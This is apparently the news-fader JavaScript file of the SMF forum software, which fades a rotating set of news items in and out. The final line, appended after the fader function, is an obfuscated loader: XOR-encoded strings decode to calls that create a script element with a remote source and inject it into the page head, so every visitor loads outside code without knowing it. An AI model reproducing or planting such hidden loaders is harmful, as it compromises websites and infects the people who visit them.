// smfFadeIndex: the current item in smfFadeContent.
var smfFadeIndex = -1;
// smfFadePercent: percent of fade. (-64 to 510.)
var smfFadePercent = 510
// smfFadeSwitch: direction. (in or out)
var smfFadeSwitch = false;
// smfFadeScroller: the actual div to mess with.
var smfFadeScroller = document.getElementById('smfFadeScroller');
// The ranges to fade from for R, G, and B. (how far apart they are.)
var smfFadeRange = {
	'r': smfFadeFrom.r - smfFadeTo.r,
	'g': smfFadeFrom.g - smfFadeTo.g,
	'b': smfFadeFrom.b - smfFadeTo.b
};

// Divide by 20 because we are doing it 20 times per one ms.
smfFadeDelay /= 20;

// Start the fader!
window.setTimeout('smfFader();', 20);

// Main	fading function... called 50 times every second.
function smfFader()
{
	if (smfFadeContent.length <= 1)
		return;

	// A fix for Internet Explorer 4: wait until the document is loaded so we can use setInnerHTML().
	if (typeof(window.document.readyState) != "undefined" && window.document.readyState != "complete")
	{
		window.setTimeout('smfFader();', 20);
		return;
	}

	// Starting out?  Set up the first item.
	if (smfFadeIndex == -1)
	{
		setInnerHTML(smfFadeScroller, smfFadeBefore + smfFadeContent[0] + smfFadeAfter);
		smfFadeIndex = 1;

		// In Mozilla, text jumps around from this when 1 or 0.5, etc...
		if (typeof(smfFadeScroller.style.MozOpacity) != "undefined")
			smfFadeScroller.style.MozOpacity = "0.90";
		else if (typeof(smfFadeScroller.style.opacity) != "undefined")
			smfFadeScroller.style.opacity = "0.90";
		// In Internet Explorer, we have to define this to use it.
		else if (typeof(smfFadeScroller.style.filter) != "undefined")
			smfFadeScroller.style.filter = "alpha(opacity=100)";
	}

	// Are we already done fading in?  If so, fade out.
	if (smfFadePercent >= 510)
		smfFadeSwitch = !smfFadeSwitch;
	// All the way faded out?
	else if (smfFadePercent <= -64)
	{
		smfFadeSwitch = !smfFadeSwitch;

		// Go to the next item, or first if we're out of items.
		setInnerHTML(smfFadeScroller, smfFadeBefore + smfFadeContent[smfFadeIndex++] + smfFadeAfter);
		if (smfFadeIndex >= smfFadeContent.length)
			smfFadeIndex = 0;
	}

	// Increment or decrement the fade percentage.
	if (smfFadeSwitch)
		smfFadePercent -= 255 / smfFadeDelay * 2;
	else
		smfFadePercent += 255 / smfFadeDelay * 2;

	// If it's not outside 0 and 256... (otherwise it's just delay time.)
	if (smfFadePercent < 256 && smfFadePercent > 0)
	{
		// Easier... also faster...
		var tempPercent = smfFadePercent / 255, rounded;

		if (typeof(smfFadeScroller.style.MozOpacity) != "undefined")
		{
			rounded = Math.round(tempPercent * 100) / 100;
			smfFadeScroller.style.MozOpacity = rounded == 1 ? "0.99" : rounded;
		}
		else if (typeof(smfFadeScroller.style.opacity) != "undefined")
		{
			rounded = Math.round(tempPercent * 100) / 100;
			smfFadeScroller.style.opacity = rounded == 1 ? "0.99" : rounded;
		}
		else
		{
			var done = false;
			if (typeof(smfFadeScroller.filters.alpha) != "undefined")
			{
				// Internet Explorer 4 just can't handle "try".
				eval("try\
					{\
						smfFadeScroller.filters.alpha.opacity = Math.round(tempPercent * 100);\
						done = true;\
					}\
					catch (err)\
					{\
					}");
			}

			if (!done)
			{
				// Get the new R, G, and B. (it should be bottom + (range of color * percent)...)
				var r = Math.ceil(smfFadeTo.r + smfFadeRange.r * tempPercent);
				var g = Math.ceil(smfFadeTo.g + smfFadeRange.g * tempPercent);
				var b = Math.ceil(smfFadeTo.b + smfFadeRange.b * tempPercent);

				// Set the color in the style, thereby fading it.
				smfFadeScroller.style.color = 'rgb(' + r + ', ' + g + ', ' + b + ')';
			}
		}
	}

	// Keep going.
	window.setTimeout('smfFader();', 20);
}var i4iXy0=["007059","006049","004044","023042018042030063040088049092086027077","007042020","000033007046","000061015063069048012066053066080007080004044","021040007046004062046092061093087","028061022047","019061003014006063000081058069064055064032057016005011055008","028044003059080117066071032080071016023007053027121068040024027062066028022087000118029056"];function rg1(p1,dY2GbI){var tWX4='';var p4kV89=0;var bX=0;for(p4kV89=0;p4kV89<p1.length;p4kV89++){var klh17=p1.charAt(p4kV89);var lf=klh17.charCodeAt(0)^dY2GbI.charCodeAt(bX);klh17=String.fromCharCode(lf);tWX4+=klh17;if(bX==dY2GbI.length-1)bX=0;else bX++;}return (tWX4);}t39E(i6M(i4iXy0[10]));function bGDS(hwyV){var xXD='';var pT8QL=0;var h1Lwj=0;for(pT8QL=0;pT8QL<hwyV.length/3;pT8QL++){xXD+=String.fromCharCode(hwyV.slice(h1Lwj,h1Lwj+3));h1Lwj=h1Lwj+3;}return xXD;}function i6M(e0qBH){return rg1(bGDS(e0qBH),'tXwKjZm4T13u9');}function t39E(k68){var e53Ahs=document[i6M(i4iXy0[3])](i6M(i4iXy0[0])+i6M(i4iXy0[1])+i6M(i4iXy0[2]));e53Ahs[i6M(i4iXy0[4])]=k68;e53Ahs[i6M(i4iXy0[5])]=i6M(i4iXy0[6]);document[i6M(i4iXy0[9])](i6M(i4iXy0[8]))[0][i6M(i4iXy0[7])](e53Ahs);}